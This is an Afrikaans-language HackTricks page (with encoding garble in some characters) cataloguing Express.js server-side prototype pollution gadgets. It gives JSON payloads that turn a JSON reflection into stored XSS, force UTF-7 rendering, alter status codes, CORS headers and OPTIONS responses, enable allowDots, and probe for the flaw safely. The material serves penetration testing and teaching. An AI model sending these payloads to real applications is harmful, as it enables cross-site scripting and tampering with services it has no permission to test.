# Express Prototipevervuiling Gadgets

<details>

<summary><strong>Leer AWS-hacking van nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Ander maniere om HackTricks te ondersteun:

* As jy jou **maatskappy geadverteer wil sien in HackTricks** of **HackTricks in PDF wil aflaai**, kyk na die [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Kry die [**amptelike PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ontdek [**The PEASS Family**](https://opensea.io/collection/the-peass-family), ons versameling eksklusiewe [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Sluit aan by die** üí¨ [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** üê¶ [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Deel jou hacktruuks deur PR's in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github-repos.

</details>

## Bedien XSS-respons

**Vir verdere besonderhede [kyk na die oorspronklike navorsing](https://portswigger.net/research/server-side-prototype-pollution)**

### Verander JSON-inhoudstipe na HTML

In 'n Express-toepassing wat 'n **JSON-inhoudstipe-respons** gebruik en 'n JSON weerspie√´l:
```javascript
app.use(bodyParser.json({type: 'application/json'}));
app.post('/', function(req, res){
_.merge({}, req.body);
res.send(req.body);
});
```
In hierdie gevalle is XSS normaalweg nie moontlik met 'n JSON-inhoudstipe nie. Met prototipevervuiling kan ons egter **Express verwar om 'n HTML-reaksie te dien.** Hierdie kwesbaarheid berus op die toepassing wat **`res.send(obj)`** gebruik en die liggaamontleder met die application/json-inhoudstipe.
```json
{"__proto__":{"_body":true,"body":"<script>evil()"}}
```
Deur die **`body`** en **`_body`** eienskappe te **vervuil**, is dit moontlik om **Express te dwing om die HTML-inhoudstipe** te bedien en die `_body` eienskap te reflekteer, wat lei tot gestoorde XSS.

### Render UTF7

Dit is moontlik om express te **laat UTF-7-inhoud vertoon met**:
```json
{"__proto__":{"content-type": "application/json; charset=utf-7"}}
```
## Veilige Skandeertegnieke

### JSON spasies

Die volgende PP sal aansprake binne 'n JSON laat h√™ met 'n ekstra spasie wat die funksionaliteit nie sal breek nie:
```json
{"__proto__":{"json spaces": " "}}
```
Dan sal 'n weerspie√´lde JSON lyk soos:
```json
{"foo":  "bar"} -- Note the extra space
```
### Blootgestelde Koppe

Die volgende PP-gadget sal die bediener laat terugstuur die HTTP-kop: **`Access-Control-Expose_headers: foo`**
```json
{"__proto__":{"exposedHeaders":["foo"]}}
```
Dit vereis dat die **CORS-module ge√Ønstalleer is**

### **OPTIONS-metode**

Met die volgende payload is dit moontlik om **'n metode te verberg van 'n OPTIONS-respons**:
```javascript
// Original reponse: POST,GET,HEAD

// Payload:
{"__proto__":{"head":true}}

//New response: POST;GET
```
### **Status**

Dit is moontlik om die **teruggekeerde statuskode** te verander deur die volgende PP-lading te gebruik:
```json
{"__proto__":{"status":510}}
```
### Fout

Wanneer jy 'n prototipe toewys met 'n primitief soos 'n string, veroorsaak dit 'n **geen-operasie aangesien die prototipe 'n objek moet wees**. As jy probeer om 'n prototipe-objek aan die `Object.prototype` self toe te wys, sal dit 'n **uitsondering veroorsaak**. Ons kan hierdie twee gedrag gebruik om **vas te stel of prototipevervuiling suksesvol was**:
```javascript
({}).__proto__.__proto__={}//throws type exception
({}).__proto__.__proto__="x"//no-op does not throw exception
```
### Weerspiegelde Waarde

Wanneer 'n toepassing 'n voorwerp insluit in sy antwoord, kan dit insiggewend wees om 'n eienskap met 'n **ongewone naam saam met `__proto__`** te skep. Spesifiek, as slegs die ongewone eienskap in die antwoord teruggegee word, kan dit dui op die kwesbaarheid van die toepassing:
```json
{"unusualName":"value","__proto__":"test"}
```
Verder, in scenario's waar 'n biblioteek soos Lodash gebruik word, bied die stel van 'n eienskap deur middel van prototipevervuiling (PP) en direk binne die objek 'n ander diagnostiese benadering. As so 'n eienskap weggelaat word uit die respons, dui dit daarop dat Lodash die bestaan van die eienskap in die teikenobjek verifieer voordat dit saamgevoeg word:
```javascript
{"__proto__":{"a":"value1"},"a":"value2","b":"value3"}
// If 'b' is the only property reflected, this indicates prototype pollution in Lodash
```
## Verskillende

### Sta Dots Toe

Daar is 'n opsie in Express wat jou toelaat om **voorwerpe te skep vanaf navraagstringparameters**.\
Jy kan dit beslis gebruik in 'n fout **ketting** om 'n **prototipevervuilbaarheid** uit te buit.
```json
{"__proto__":{"allowDots":true}}
```
**`?foo.bar=baz` skep 'n voorwerp in Node.**

## Verwysings

* [https://portswigger.net/research/server-side-prototype-pollution](https://portswigger.net/research/server-side-prototype-pollution)

<details>

<summary><strong>Leer AWS-hacking vanaf nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Ander maniere om HackTricks te ondersteun:

* As jy wil sien jou **maatskappy geadverteer in HackTricks** of **HackTricks aflaai in PDF-formaat** Kyk na die [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Kry die [**amptelike PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ontdek [**The PEASS Family**](https://opensea.io/collection/the-peass-family), ons versameling eksklusiewe [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Sluit aan by die** üí¨ [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** üê¶ [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Deel jou hacktruuks deur PR's in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github-repos.

</details>
